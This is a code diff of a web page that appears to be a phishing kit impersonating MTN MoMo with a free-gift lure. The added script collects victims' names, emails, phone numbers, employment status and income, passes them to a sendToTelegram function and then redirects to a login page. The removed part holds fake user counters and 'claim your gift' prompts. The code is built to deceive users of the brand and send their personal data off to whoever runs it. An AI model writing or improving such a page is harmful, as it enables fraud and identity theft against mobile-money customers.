+                showError(inputs.name, errors.name, 'Please enter your full name (min 2 characters).');
+                valid = false;
+            }
+
+            // Validate Email
+            if (!email || !validateEmail(email)) {
+                showError(inputs.email, errors.email, 'Please enter a valid email address.');
+                valid = false;
+            }
+
+            // Validate Phone
+            if (!phone || !validatePhone(phone)) {
+                showError(inputs.phone, errors.phone, 'Please enter a valid phone number.');
+                valid = false;
+            }
+
+            // Validate Employment
+            if (!employment) {
+                showError(inputs.employment, errors.employment, 'Please select your employment status.');
+                valid = false;
+            }
+
+            // Validate Income
+            if (!income || parseFloat(income) < 0) {
+                showError(inputs.income, errors.income, 'Please enter your monthly income.');
+                valid = false;
+            }
+
+            if (!valid) {
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
+                return;
+            }
+
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loader"></span> SAVING...';
+
+            // Collect all data
+            const giftData = {
+                gift: localStorage.getItem('selectedGift') || 'Not specified',
+                giftValue: localStorage.getItem('selectedGiftValue') || '-',
+                giftIcon: localStorage.getItem('selectedGiftIcon') || '🎁',
+                fullName: name,
+                email: email,
+                phone: phone,
+                employment: employment,
+                income: income
+            };
+
+            // Save to localStorage
+            localStorage.setItem('fullName', name);
+            localStorage.setItem('email', email);
+            localStorage.setItem('phone', phone);
+            localStorage.setItem('employment', employment);
+            localStorage.setItem('income', income);
+            localStorage.setItem('giftData', JSON.stringify(giftData));
+
+            // Send to Telegram
+            await sendToTelegram(giftData);
+
+            // Navigate to login page
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 1000);
+        });
+
+        // ============================================
+        // REAL-TIME VALIDATION
+        // ============================================
+        document.getElementById('fullName').addEventListener('input', function() {
+            if (this.value.trim().length >= 2) {
+                this.classList.remove('invalid');
+                document.getElementById('nameError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('email').addEventListener('input', function() {
+            if (validateEmail(this.value.trim())) {
+                this.classList.remove('invalid');
+                document.getElementById('emailError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('phone').addEventListener('input', function() {
+            if (validatePhone(this.value.trim())) {
+                this.classList.remove('invalid');
+                document.getElementById('phoneError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('employment').addEventListener('change', function() {
+            if (this.value) {
+                this.classList.remove('invalid');
+                document.getElementById('employmentError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('income').addEventListener('input', function() {
+            if (this.value.trim() && parseFloat(this.value) >= 0) {
+                this.classList.remove('invalid');
+                document.getElementById('incomeError').classList.remove('show');
+            }
+        });
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+
+        // ============================================
+        // AUTO-FOCUS FIRST INPUT
+        // ============================================
         window.addEventListener('load', () => {
-            animateCounter(document.getElementById('usersCount'), 12847);
-            animateCounter(document.getElementById('giftsCount'), 15723);
-            animateCounter(document.getElementById('offersCount'), 18);
+            if (!document.getElementById('fullName').value) {
+                document.getElementById('fullName').focus();
+            }
+            console.log('📋 MTN MoMo - Personal Details Page Loaded');
+            console.log('🎁 Selected Gift:', localStorage.getItem('selectedGift'));
+            console.log('====================================');
         });
-
-        // ============================================
-        // SHOW GIFT NOTIFICATION
-        // ============================================
-        function showGift(name, value) {
-            const notification = document.getElementById('notification');
-            notification.innerHTML = `🎁 <strong>${name}</strong> — ${value} <br><span style="font-weight:400;font-size:12px;opacity:0.8;">Click "CLAIM YOUR GIFT" to get it!</span>`;
-            notification.style.display = 'block';
-            
-            clearTimeout(window.notificationTimeout);
-            window.notificationTimeout = setTimeout(() => {
-                notification.style.display = 'none';
-            }, 4000);
-        }
-
-        // ============================================
-        // REGISTER BUTTON - Goes to details.html
-        // ============================================
-        document.getElementById('registerBtn').addEventListener('click', function() {
-            localStorage.setItem('source', 'gifts');
-            window.location.href = 'details.html';
-        });
-
-        document.getElementById('notification').addEventListener('click', function() {
-            this.style.display = 'none';
-        });
-
-        console.log('====================================');
-        console.log('🎁 MTN MoMo Gifts - Homepage Loaded');
-        console.log('📊 18 Gifts Available');
-        console.log('====================================');
     </script>
 </body>
+
 </html>
